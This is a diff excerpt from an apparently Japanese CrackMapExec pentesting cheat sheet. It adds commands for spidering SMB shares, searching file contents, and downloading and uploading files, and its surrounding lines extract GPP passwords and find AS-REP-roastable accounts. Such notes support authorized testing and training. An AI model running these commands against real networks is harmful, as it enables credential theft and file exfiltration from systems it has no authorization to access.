@@ -29,6 +29,13 @@ crackmapexec smb <network IP> --gen-relay-list output.txt # SMB署名が無効�
 
 crackmapexec smb <IP> -d <domain> -u <user> -p <pass> -M gpp_password (もしくは gpp_autologin) #GPOに記述された認証情報を取得する。古いサーバ（2003～2008）に有効
 
+crackmapexec smb <IP> -u <user> -p <pass> --spider <share name> --pattern txt #--spiderは--patternで指定して形式のファイルをSMB内から探索する
+--regex #より詳細な検索を行うオプションを備えた正規表現
+--content #ファイルの内容を検索する
+--get-file <file name> <new file name> #ファイルのダウンロード
+--put-file <put file path> #ファイルのアップロード
+
+
 //列挙（ldap)
 crackmapexec ldap <domain> -u user.txt -p '' --asreproast output.txt #Kerberos事前認証を必要としないASREPRoast脆弱性を持つユーザーを探す
 
